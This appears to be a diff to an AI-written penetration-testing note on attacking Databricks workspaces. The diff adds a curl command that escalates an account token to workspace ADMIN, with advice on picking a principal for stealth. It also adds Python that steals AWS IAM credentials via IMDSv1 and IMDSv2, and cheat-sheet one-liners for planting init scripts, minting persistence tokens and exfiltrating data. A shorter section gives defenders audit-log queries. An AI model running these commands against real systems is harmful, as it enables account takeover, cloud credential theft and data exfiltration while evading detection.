@@ -128,6 +128,21 @@ curl -s https://accounts.cloud.databricks.com/api/2.0/accounts/<account_id>/scim
 
 ## Attack Vectors
 
+### Account Admin → Workspace Admin (Cross-Workspace Takeover)
+
+An account-level credential doesn't automatically grant admin *inside* every workspace — but an account admin can **assign it**. The workspace permission-assignment API lets you grant `ADMIN` on any workspace to any principal (yourself, a controlled SP), turning "account console access" into full data-plane control of every workspace in the account. This is the Databricks equivalent of Entra's GA→resource-plane pivot.
+
+```bash
+# Grant ADMIN on a target workspace to a principal you control (verified against the Account API)
+curl -s -X PUT \
+  "https://accounts.cloud.databricks.com/api/2.0/accounts/<account_id>/workspaces/<workspace_id>/permissionassignments/principals/<principal_id>" \
+  -H "Authorization: Bearer <account_token>" -H "Content-Type: application/json" \
+  -d '{"permissions":["ADMIN"]}'
+# permissions: ["ADMIN"] or ["USER"]; [] deletes the assignment. principal_id = the SCIM user/SP/group id.
+```
+
+> [!warning] This writes an audit event and shows up in the workspace's admin list — loud, but decisive. Prefer granting to an existing over-privileged SP over a fresh principal if stealth matters.
+
 ### Notebook Code Execution → Cloud Metadata
 
 Any notebook cell gives OS-level access as the cluster service account. In cloud environments, this reaches the instance metadata service (IMDS) — leaking cloud credentials.
@@ -151,8 +166,18 @@ token_url = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2
 print(requests.get(token_url, headers={"Metadata": "true"}).json()['access_token'])
 
 # --- AWS IMDS — steal IAM role credentials ---
+# IMDSv1 (works only where the hop-limit/token requirement is NOT enforced):
 role = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/").text
 creds = requests.get(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}").json()
+print(creds['AccessKeyId'], creds['SecretAccessKey'], creds['Token'])
+
+# IMDSv2 (required on hardened clusters — get a session token first, then send it on every request).
+# The v1 calls above return 401 when IMDSv2 is enforced, so reach for this before assuming "no metadata".
+tok = requests.put("http://169.254.169.254/latest/api/token",
+                   headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"}).text
+h = {"X-aws-ec2-metadata-token": tok}
+role = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/", headers=h).text
+creds = requests.get(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}", headers=h).json()
 print(creds['AccessKeyId'], creds['SecretAccessKey'], creds['Token'])
 
 # --- GCP Metadata ---
@@ -284,6 +309,17 @@ aws secretsmanager list-secrets
 
 ---
 
+## Detection & Artefacts
+
+What your activity leaves behind — and where a defender (or you, during a review) looks for it.
+
+- **Audit logs → `system.access.audit`.** With the Unity Catalog system tables enabled, every API action is queryable in SQL: `SELECT * FROM system.access.audit WHERE action_name IN ('createToken','generateDbToken','updatePermissionAssignment') ORDER BY event_time DESC`. Token creation, permission grants, secret reads and notebook exports all land here.
+- **Cloud-side audit** (the account's diagnostic settings → log-analytics/CloudTrail) records the *same* actions independently, so scrubbing Databricks-side logs isn't enough.
+- **IMDS credential theft is visible cloud-side, not Databricks-side** — a cluster's IAM role or managed identity suddenly calling `sts:GetCallerIdentity` / ARM from an unusual pattern is the tell. IMDSv2 enforcement + hop-limit `1` is the mitigation.
+- **Token / SP-secret inventory** is the fastest persistence hunt: `GET /api/2.0/token/list` and the account SCIM ServicePrincipals endpoint — look for tokens with no expiry and SP secrets created off-cycle.
+
+---
+
 ## Dangerous Settings
 
 | Setting | Risk |
@@ -312,13 +348,17 @@ aws secretsmanager list-secrets
 | Export notebook | `curl ... /api/2.0/workspace/export?path=<path>&format=SOURCE` |
 | Read secret (notebook) | `dbutils.secrets.get(scope="<scope>", key="<key>")` |
 | Azure IMDS token | `curl http://169.254.169.254/metadata/identity/oauth2/token?...` |
-| AWS IMDS creds | `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` |
+| AWS IMDSv2 creds | `TOKEN=$(curl -sX PUT .../latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); curl -H "X-aws-ec2-metadata-token: $TOKEN" .../iam/security-credentials/<role>` |
+| Account→workspace admin | `PUT .../accounts/<id>/workspaces/<wsid>/permissionassignments/principals/<pid>` `{"permissions":["ADMIN"]}` |
+| Hunt tokens/persistence | `SELECT * FROM system.access.audit WHERE action_name='createToken'` |
 | Plant init script | `dbutils.fs.put("dbfs:/databricks/scripts/x.sh", payload, overwrite=True)` |
 | Mint persistence PAT | `POST /api/2.0/token/create` |
 | Run SQL / exfil data | `POST /api/2.0/sql/statements` with warehouse_id + statement |
 
+> [!note] **See also** — sibling data-platform notes [[Services/Cloud & Data/Flink|Flink]] and [[Services/Cloud & Data/Kafka|Kafka]] share the RCE→cloud-metadata (IMDS) pivot; the identity-plane side of an Azure-hosted workspace is [[Services/Active Directory/Entra ID|Entra ID]]. Cloud pivot tooling: [[Tools/Cloud/aws-cli|aws-cli]], [[Tools/Cloud/Pacu|Pacu]], [[Tools/Cloud/ScoutSuite|ScoutSuite]].
+
 ---
 
 *Created: 2026-07-28*
-*Updated: 2026-07-28*
+*Updated: 2026-09-22*
 *Model: claude-opus-4-8*
